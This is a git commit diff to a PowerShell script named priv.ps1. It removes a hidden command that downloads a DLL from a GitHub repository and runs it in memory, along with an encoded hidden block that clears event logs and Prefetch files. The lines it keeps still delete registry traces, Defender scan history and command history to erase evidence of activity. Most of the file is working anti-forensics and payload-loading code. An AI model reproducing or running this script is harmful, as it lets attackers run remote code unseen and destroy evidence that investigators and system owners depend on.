a244f83f566c3eb2377c3654c0398954f2c104b8
zold1337 <152819963+zold1337@users.noreply.github.com>
2026-07-07 23:10:54 -0300

    Update priv.ps1

--- priv.ps1
+++ priv.ps1
@@ -18,22 +18,20 @@ while ((Get-Date) -lt $timeout) {
     if (Get-Process Discord -ErrorAction SilentlyContinue) {
         break
     }
-    Start-Sleep 1
+    Start-Sleep -Seconds 1
 }
 
 if (-not (Get-Process Discord -ErrorAction SilentlyContinue)) {
-    Remove-Item -Path "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction SilentlyContinue
-    Remove-Item -Path "C:\Windows\Prefetch\RUNONCE*" -Force -ErrorAction SilentlyContinue
-    Remove-Item -Path "C:\Windows\Prefetch\CONHOST*" -Force -ErrorAction SilentlyContinue
-    Remove-Item -Path "C:\Windows\Prefetch\DLLHOST*" -Force -ErrorAction SilentlyContinue
-    Remove-Item -Path "C:\Windows\Prefetch\WEVTUTIL*" -Force -ErrorAction SilentlyContinue
-    Remove-Item -Path "C:\Windows\Prefetch\CMD*" -Force -ErrorAction SilentlyContinue
-    Remove-Item -Path "C:\Windows\Prefetch\REG*" -Force -ErrorAction SilentlyContinue
-    Remove-Item -Path "C:\Windows\Prefetch\FSUTIL*" -Force -ErrorAction SilentlyContinue
-    Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
-    Clear-History -ErrorAction SilentlyContinue
-   Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -WindowStyle Hidden -Command "$wc=New-Object Net.WebClient;$b=$wc.DownloadData(''https://github.com/zold1337/toolsvip/raw/refs/heads/main/ware.dll'');$a=[Reflection.Assembly]::Load($b);$a.GetType(''ServiceManagerApp.MainTool'').GetMethod(''ExecuteAll'').Invoke($null,$null)"'
-   Exit
+
+    $discordPath = "$env:LOCALAPPDATA\Discord\Update.exe"
+
+    if (Test-Path $discordPath) {
+        Start-Process $discordPath -ArgumentList "--processStart Discord.exe"
+    }
+    else {
+        Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("Not Found","Error",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Error)
+        Exit
+	}
 }
 Start-Sleep 5
 
@@ -59,7 +57,6 @@ Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\Mic
 Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\ProgramData\Microsoft\Windows\WER\ReportArchive\*"
 Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\*"
 Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\Microsoft\Windows\History\*"
-
 Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Recurse -Force -ErrorAction SilentlyContinue
@@ -79,61 +76,14 @@ Remove-Item -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatF
 Remove-Item -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "HKLM:\SYSTEM\ControlSet001\Control\Session Manager\AppCompatCache" -Recurse -Force -ErrorAction SilentlyContinue
-
-
 Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\ShowJumpView" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppLaunch" -Recurse -Force -ErrorAction SilentlyContinue
-
-
 Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\CIDSizeMRU" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count" -Recurse -Force -ErrorAction SilentlyContinue
-
-Remove-Item -Path "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction SilentlyContinue
-Remove-Item -Path "C:\Windows\Prefetch\RUNONCE*" -Force -ErrorAction SilentlyContinue
 Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 Clear-History -ErrorAction SilentlyContinue
-
-
-
-$scriptBlock = {
-    
-	Start-Sleep -Seconds 3
-    $services = @("vss", "dps", "diagtrack", "bam", "dam", "sysmondrv", "sysmon", "sysmain", "eventlog")
-    foreach ($svc in $services) {
-        Set-Service -Name $svc -StartupType Automatic -ErrorAction SilentlyContinue
-    }
-
-    
-    foreach ($svc in $services) {
-        if ($svc -notin @("sysmain", "eventlog", "sysmon", "sysmondrv")) {
-            Start-Service -Name $svc -ErrorAction SilentlyContinue
-        }
-    }
-
-
-    Start-Service -Name "eventlog" -ErrorAction SilentlyContinue
-    Start-Service -Name "sysmain" -ErrorAction SilentlyContinue
-    Start-Service -Name "sysmon" -ErrorAction SilentlyContinue
-    Start-Service -Name "sysmondrv" -ErrorAction SilentlyContinue
-
-
-    $cmdCommands = 'wevtutil cl "Windows PowerShell" && ' +
-                   'del /f /q "C:\Windows\Prefetch\POWERSHELL*" && ' +
-                   'del /f /q "C:\Windows\Prefetch\RUNONCE*" && ' +
-                   'del /f /q "C:\Windows\Prefetch\CONHOST*" && ' +
-                   'del /f /q "C:\Windows\Prefetch\DLLHOST*" && ' +
-                   'del /f /q "C:\Windows\Prefetch\WEVTUTIL*" && ' +
-                   'del /f /q "C:\Windows\Prefetch\CMD*" && ' +
-                   'del /f /q "C:\Windows\Prefetch\REG*" && ' +
-                   'del /f /q "C:\Windows\Prefetch\FSUTIL*"'
-
-    Start-Process cmd.exe -ArgumentList "/c $cmdCommands" -WindowStyle Hidden
-}
-
-$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($scriptBlock.ToString()))
-Start-Process powershell.exe -ArgumentList "-NoProfile -EncodedCommand $encodedCommand" -WindowStyle Hidden
 Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 Clear-History -ErrorAction SilentlyContinue
 Exit
